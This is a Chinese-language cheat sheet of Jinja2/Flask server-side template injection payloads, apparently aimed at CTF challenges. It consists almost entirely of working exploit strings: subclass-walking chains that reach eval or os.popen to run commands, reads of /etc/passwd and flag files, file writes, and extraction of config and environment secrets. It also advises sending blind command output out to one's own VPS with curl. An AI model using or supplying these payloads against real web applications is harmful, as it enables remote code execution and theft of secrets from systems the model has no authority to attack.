## 官方POC

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

一行的

```python
?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag.txt').read()") }}{% endif %}{% endfor %}

```

## CTF应用

### 沙盒逃逸

```python
#config
{{config}}#可以获取当前设置，如果题目类似app.config ['FLAG'] = os.environ.pop（'FLAG'），那可以直接访问{{config['FLAG']}}或者{{config.FLAG}}得到flag

#self
{{self}}# ⇒ <TemplateReference None>
{{self.__dict__._TemplateReference__context.config}}# ⇒ 同样可以找到config

#""、[]、()等数据结构
#主要目的是配合__class__.__mro__[2]这样找到object类
{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']}}

#如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）
{{url_for.__globals__['current_app'].config.FLAG}}

{{get_flashed_messages.__globals__['current_app'].config.FLAG}}

{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
```

### 文件读取

现在只需要从这些类中寻找需要的类，用数组下标获取，然后执行该类中想要执行的函数即可。比如第41个类是file类，就可以构造利用：

```python
''.__class__.__mro__[2].__subclasses__()[40]('<File_To_Read>').read()
```

再比如，如果没有file类，使用类`<class '_frozen_importlib_external.FileLoader'>`，可以进行文件的读取。这里是第91个类。

```python
''.__class__.__mro__[2].__subclasses__()[91].get_data(0,"<file_To_Read>")
```

### 命令执行

首先通过脚本找到包含os模块的类

```python
num = 0
for item in ''.__class__.__mro__[1].__subclasses__():
    try:
         if 'os' in item.__init__.__globals__:
             print (num,item)
         num+=1
    except:
        print ('-')
        num+=1
```

假设输出为x编号的类，则可以构造

```python
''.__class__.__mro__[1].__subclasses__()[x].__init__.__globals__['os'].system('ls')
```

命令执行的结果如果不能直接看到，可以考虑通过curl工具发送到自己的VPS，或者使用CEYE平台。

执行脚本发现，包含os模块的类：

```python
<class 'site._Printer'>
<class 'site.Quitter'>
```

### 基础payload

```python
#获得基类
#python2.7
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]
#python3.7
''.__。。。class__.__mro__[1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

#python 2.7
#文件操作
#找到file类
[].__class__.__bases__[0].__subclasses__()[40]
#读文件
[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
#写文件
[].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')

#命令执行
#os执行
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
#eval,impoer等全局函数
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()

#python3.7
#命令执行
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
#windows下的os命令
"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()

```

